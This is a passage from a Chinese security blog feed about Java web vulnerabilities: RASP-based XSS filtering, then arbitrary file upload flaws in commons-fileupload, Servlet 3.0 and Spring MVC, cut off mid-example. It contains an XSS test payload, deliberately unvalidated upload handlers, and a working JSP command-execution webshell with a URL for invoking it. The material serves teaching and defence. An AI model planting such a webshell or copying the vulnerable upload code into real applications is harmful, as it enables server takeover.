XSS攻击防御</h3><p>RASP可以实现类似于全局XSSFilter的请求参数过滤功能，比较稳定的一种方式是Hook到javax.servlet.ServletRequest接口的实现类的getParameter&#x2F;getParameterValues&#x2F;getParameterMap等核心方法，在该方法return之后插入RASP的检测代码。这种实现方案虽然麻烦，但是可以避免触发Http请求参数解析问题（Web应用无法获取getInputStream和乱码等问题）。</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/image-20201115172732140.png"></p><p>反射型的XSS防御相对来说比较简单，直接禁止GET参数中出现&lt;&gt;标签，只要出现就理解拦截，如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8000/modules/servlet/xss.jsp?input=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>过滤或拦截掉&lt;&gt;后input参数就不再具有攻击性了。</p><p>但是POST请求的XSS参数就没有那么容易过滤了，为了兼顾业务，不能简单的使用htmlSpecialChars的方式直接转义特殊字符，因为很多时候应用程序是必须支持HTML标签的（如：&lt;img&gt;、&lt;h1&gt;等）。RASP在防御XSS攻击的时候应当尽可能的保证用户的正常业务不受影响，否则可能导致用户无法业务流程阻塞或崩溃。</p><p>为了支持一些常用的HTML标签和HTML标签属性，RASP可以通过词法解析的方式，将传入的字符串参数值解析成HTML片段，然后分析其中的标签和属性是否合法即可。</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/image-20201115180617209.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java Web常见漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java Web常见漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 任意文件上传漏洞</title>
      <link href="/2025/08/23/java%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/08/23/java%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="任意文件上传漏洞"><a href="#任意文件上传漏洞" class="headerlink" title="任意文件上传漏洞"></a>任意文件上传漏洞</h1><p>Web应用通常都会包含文件上传功能，用户可以将其本地的文件上传到Web服务器上。如果服务器端没有能够正确的检测用户上传的文件类型是否合法(例如上传了jsp后缀的WebShell)就将文件写入到服务器中就可能会导致服务器被非法入侵。</p><h2 id="1-Apache-commons-fileupload文件上传测试"><a href="#1-Apache-commons-fileupload文件上传测试" class="headerlink" title="1. Apache commons fileupload文件上传测试"></a>1. Apache commons fileupload文件上传测试</h2><p>Apache commons-fileupload是一个非常常用的文件上传解析库，Spring MVC、Struts2、Tomcat等底层处理文件上传请求都是使用的这个库。</p><p><strong>示例 - Apache commons-fileupload文件上传：</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.commons.fileupload.FileItemIterator&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.commons.fileupload.FileItemStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.commons.fileupload.servlet.ServletFileUpload&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.commons.fileupload.util.Streams&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.File&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.FileOutputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span> (ServletFileUpload.isMultipartContent(request)) &#123;</span><br><span class="line">        <span class="type">ServletFileUpload</span> <span class="variable">fileUpload</span>       <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletFileUpload</span>();</span><br><span class="line">        <span class="type">FileItemIterator</span>  <span class="variable">fileItemIterator</span> <span class="operator">=</span> fileUpload.getItemIterator(request);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">dir</span>       <span class="operator">=</span> request.getServletContext().getRealPath(<span class="string">&quot;/uploads/&quot;</span>);</span><br><span class="line">        <span class="type">File</span>   <span class="variable">uploadDir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(dir);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!uploadDir.exists()) &#123;</span><br><span class="line">            uploadDir.mkdir();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (fileItemIterator.hasNext()) &#123;</span><br><span class="line">            <span class="type">FileItemStream</span> <span class="variable">fileItemStream</span> <span class="operator">=</span> fileItemIterator.next();</span><br><span class="line">            <span class="type">String</span>         <span class="variable">fieldName</span>      <span class="operator">=</span> fileItemStream.getFieldName();<span class="comment">// 字段名称</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (fileItemStream.isFormField()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">fieldValue</span> <span class="operator">=</span> Streams.asString(fileItemStream.openStream());<span class="comment">// 字段值</span></span><br><span class="line">                out.println(fieldName + <span class="string">&quot;=&quot;</span> + fieldValue);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">fileName</span>   <span class="operator">=</span> fileItemStream.getName();</span><br><span class="line">                <span class="type">File</span>   <span class="variable">uploadFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(uploadDir, fileName);</span><br><span class="line">                out.println(fieldName + <span class="string">&quot;=&quot;</span> + fileName);</span><br><span class="line">                <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(uploadFile);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 写文件</span></span><br><span class="line">                Streams.copy(fileItemStream.openStream(), fos, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                out.println(<span class="string">&quot;文件上传成功:&quot;</span> + uploadFile.getAbsolutePath());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;File upload&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">        用户名: &lt;input name=<span class="string">&quot;username&quot;</span> type=<span class="string">&quot;text&quot;</span>/&gt;</span><br><span class="line">        文件: &lt;input id=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> type=<span class="string">&quot;file&quot;</span>/&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    &lt;input name=<span class="string">&quot;submit&quot;</span> type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Submit&quot;</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>*<strong>示例 - 本地命令执行后门代码：</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String[] cmd = request.getParameterValues(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">    <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">        out.println(<span class="keyword">new</span> <span class="title class_">String</span>(b, <span class="number">0</span>, a));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    in.close();</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/pre&gt;</span><br></pre></td></tr></table></figure><p>因为Web应用未检测用户上传的文件合法性导致了任意文件上传漏洞，访问示例中的文件上传地址：<a href="http://localhost:8000/modules/servlet/fileupload/file-upload.jsp%EF%BC%8C%E5%B9%B6%E9%80%89%E6%8B%A9%E4%B8%80%E4%B8%AA%E6%81%B6%E6%84%8F%E7%9A%84jsp%E5%90%8E%E9%97%A8">http://localhost:8000/modules/servlet/fileupload/file-upload.jsp，并选择一个恶意的jsp后门</a></p><p>访问命令执行后门测试：<a href="http://localhost:8000/uploads/cmd.jsp?cmd=ls">http://localhost:8000/uploads/cmd.jsp?cmd=ls</a></p><h2 id="2-Servlet-3-0-内置文件上传解析"><a href="#2-Servlet-3-0-内置文件上传解析" class="headerlink" title="2. Servlet 3.0 内置文件上传解析"></a>2. Servlet 3.0 内置文件上传解析</h2><p>Servlet3.0 新增了对文件上传请求解析的支持，javax.servlet.http.HttpServletRequest#getParts，使用request.getParts();即可获取文件上传包解析后的结果，从此不再需要使用第三方jar来处理文件上传请求了。</p><h3 id="2-1-JSP-multipart-config"><a href="#2-1-JSP-multipart-config" class="headerlink" title="2.1 JSP multipart-config"></a>2.1 JSP multipart-config</h3><p>JSP使用request.getParts();必须配置multipart-config，否则请求时会报错：Unable to process parts as no multi-part configuration has been provided（由于没有提供multi-part配置，无法处理parts）。</p><p>在web.xml中添加如下配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">version</span>=<span class="string">&quot;3.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>file-upload-parts.jsp<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">jsp-file</span>&gt;</span>/modules/servlet/fileupload/file-upload-parts.jsp<span class="tag">&lt;/<span class="name">jsp-file</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">multipart-config</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">max-file-size</span>&gt;</span>1000000<span class="tag">&lt;/<span class="name">max-file-size</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">max-request-size</span>&gt;</span>1000000<span class="tag">&lt;/<span class="name">max-request-size</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">file-size-threshold</span>&gt;</span>1000000<span class="tag">&lt;/<span class="name">file-size-threshold</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">multipart-config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>file-upload-parts.jsp<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/modules/servlet/fileupload/file-upload-parts.jsp<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>示例 - file-upload-parts.jsp</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.commons.io.IOUtils&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Collection&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.File&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">contentType</span> <span class="operator">=</span> request.getContentType();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检测是否是multipart请求</span></span><br><span class="line">    <span class="keyword">if</span> (contentType != <span class="literal">null</span> &amp;&amp; contentType.startsWith(<span class="string">&quot;multipart/&quot;</span>)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">dir</span>       <span class="operator">=</span> request.getSession().getServletContext().getRealPath(<span class="string">&quot;/uploads/&quot;</span>);</span><br><span class="line">        <span class="type">File</span>   <span class="variable">uploadDir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(dir);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!uploadDir.exists()) &#123;</span><br><span class="line">            uploadDir.mkdir();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Collection&lt;Part&gt; parts = request.getParts();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Part part : parts) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> part.getSubmittedFileName();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (fileName != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">File</span> <span class="variable">uploadFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(uploadDir, fileName);</span><br><span class="line">                out.println(part.getName() + <span class="string">&quot;: &quot;</span> + uploadFile.getAbsolutePath() + <span class="string">&quot;&lt;br/&gt;&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                out.println(part.getName() + <span class="string">&quot;: &quot;</span> + IOUtils.toString(part.getInputStream()) + <span class="string">&quot;&lt;br/&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;File upload&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">        用户名: &lt;input name=<span class="string">&quot;username&quot;</span> type=<span class="string">&quot;text&quot;</span>/&gt;</span><br><span class="line">        文件: &lt;input id=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> type=<span class="string">&quot;file&quot;</span>/&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    &lt;input name=<span class="string">&quot;submit&quot;</span> type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Submit&quot;</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="2-2-Servlet-MultipartConfig"><a href="#2-2-Servlet-MultipartConfig" class="headerlink" title="2.2 Servlet @MultipartConfig"></a>2.2 Servlet @MultipartConfig</h3><p>Servlet3.0 需要配置@MultipartConfig注解才能支持multipart解析。<br><strong>示例 - FileUploadServlet代码：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.io.FileUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.MultipartConfig;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Part;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.util.Collection;</span><br><span class="line"></span><br><span class="line"><span class="meta">@MultipartConfig</span></span><br><span class="line"><span class="meta">@WebServlet(urlPatterns = &quot;/FileUploadServlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileUploadServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line"></span><br><span class="line">        out.println(<span class="string">&quot;&lt;!DOCTYPE html&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;html lang=\&quot;zh\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;head&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;meta charset=\&quot;UTF-8\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;title&gt;File upload&lt;/title&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/head&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;body&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;form action=\&quot;\&quot; enctype=\&quot;multipart/form-data\&quot; method=\&quot;post\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;p&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        用户名: &lt;input name=\&quot;username\&quot; type=\&quot;text\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        文件: &lt;input id=\&quot;file\&quot; name=\&quot;file\&quot; type=\&quot;file\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;/p&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;input name=\&quot;submit\&quot; type=\&quot;submit\&quot; value=\&quot;Submit\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/form&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/body&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/html&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span>         <span class="operator">=</span> response.getWriter();</span><br><span class="line">        <span class="type">String</span>      <span class="variable">contentType</span> <span class="operator">=</span> request.getContentType();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检测是否是multipart请求</span></span><br><span class="line">        <span class="keyword">if</span> (contentType != <span class="literal">null</span> &amp;&amp; contentType.startsWith(<span class="string">&quot;multipart/&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">dir</span>       <span class="operator">=</span> request.getSession().getServletContext().getRealPath(<span class="string">&quot;/uploads/&quot;</span>);</span><br><span class="line">            <span class="type">File</span>   <span class="variable">uploadDir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(dir);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!uploadDir.exists()) &#123;</span><br><span class="line">                uploadDir.mkdir();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Collection&lt;Part&gt; parts = request.getParts();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (Part part : parts) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> part.getSubmittedFileName();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (fileName != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">File</span> <span class="variable">uploadFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(uploadDir, fileName);</span><br><span class="line">                    out.println(part.getName() + <span class="string">&quot;: &quot;</span> + uploadFile.getAbsolutePath());</span><br><span class="line"></span><br><span class="line">                    FileUtils.write(uploadFile, IOUtils.toString(part.getInputStream(), <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    out.println(part.getName() + <span class="string">&quot;: &quot;</span> + IOUtils.toString(part.getInputStream()));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-Spring-MVC文件上传"><a href="#3-Spring-MVC文件上传" class="headerlink" title="3. Spring MVC文件上传"></a>3. Spring MVC文件上传</h2><p>Spring MVC会自动解析multipart&#x2F;form-data请求，将multipart中的对象封装到MultipartRequest对象中，所以在Controller中使用@RequestParam注解就可以映射multipart中的对象了，如：@RequestParam(“file”) MultipartFile file。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 